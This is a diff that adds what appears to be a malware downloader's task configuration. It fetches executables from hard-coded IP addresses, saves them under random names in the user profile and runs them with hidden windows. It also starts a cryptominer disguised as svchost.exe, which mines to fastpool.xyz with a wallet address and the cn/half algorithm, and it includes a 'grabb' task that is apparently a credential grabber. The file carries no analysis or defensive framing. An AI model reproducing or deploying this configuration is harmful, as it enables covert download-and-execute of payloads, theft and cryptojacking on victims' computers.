@@ -1,0 +1,38 @@
+version 12
+download_period 100
+needmacrs $xmrcpu
+kills cores_gt_1
+tasks cores_gt_1
+grabb.download_id 9
+grabb.ifs 
+grabb.size_min 200000
+grabb.size_max 350000
+grabb.run $grabb
+grabb.flags NORMAL_PRIORITY_CLASS CREATE_NO_WINDOW
+grabb.next_success 
+grabb.next_error 
+grabb.next_conditions 
+litecoin.download_id 9
+litecoin.ifs 
+litecoin.urls http://103.15.106.221/rnm226.php;http://188.190.114.21/rnm226.php;http://111.121.193.238/rnm238.php
+litecoin.path %USERPROFILE%\%RND_char[4-6].exe
+litecoin.size_min 200000
+litecoin.size_max 350000
+litecoin.run 
+litecoin.flags NORMAL_PRIORITY_CLASS CREATE_NO_WINDOW
+cores_gt_1.ifs COND_CORES_GT_1
+cores_gt_1.path svchost.exe
+cores_gt_1.size_min 200000
+cores_gt_1.size_max 4000000
+cores_gt_1.run $xmrcpu
+cores_gt_1.args -o fastpool.xyz:10060 -u 9mLwUkiK8Yp89zQQYodWKN29jVVVz1cWDFZctWxge16Zi3TpHnSBnnVcCDhSRXdesnMBdVjtDwh1N71KD9z37EzgKSM1tmS.60000 -p x -k -a cn/half
+cores_gt_1.flags NORMAL_PRIORITY_CLASS CREATE_NO_WINDOW
+cores_gt_1.next_success 
+cores_gt_1.next_error 
+cores_gt_1.next_conditions 
+one_core.ifs 
+one_core.url http://130.185.108.137/pchfv.php
+one_core.path %USERPROFILE%\do.exe
+one_core.size 223744
+one_core.run "%USERPROFILE%\do.exe" %MINER_LOGIN2 -g yes -t 1 -w 300
+one_core.flags BELOW_NORMAL_PRIORITY_CLASS CREATE_NO_WINDOW
